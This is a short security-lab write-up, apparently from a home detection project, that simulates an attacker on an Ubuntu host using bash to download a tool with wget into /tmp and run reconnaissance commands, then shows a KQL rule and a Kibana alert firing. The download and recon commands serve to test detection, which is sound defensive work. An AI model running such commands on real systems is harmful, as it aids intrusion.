# Attack Simulation 4: Suspicious Shell Process Execution

## Objective
Simulate attacker using bash to download tools and run system commands.

## Attack Machine
Ubuntu (inside — post-compromise simulation)

## Attack Commands
```bash
bash -c "curl http://192.168.56.1"
bash -c "wget http://192.168.56.1 -O /tmp/tool"
bash -c "id && whoami && hostname && uname -a"
sudo bash -c "id"
```

## MITRE ATT&CK
- Technique: T1059 — Command and Scripting Interpreter
- Tactic: Execution

## Kill Chain Position
Step 5 of attack — attacker downloading tools after gaining access

## Detection Rule Triggered
- Rule: Suspicious Shell Process Execution (SP-001)
- KQL: event.dataset:system.syslog AND message:*bash*
- Status: ✅ ALERT FIRED

## Result
✅ Alert fired in Kibana Security dashboard
✅ Screenshot captured
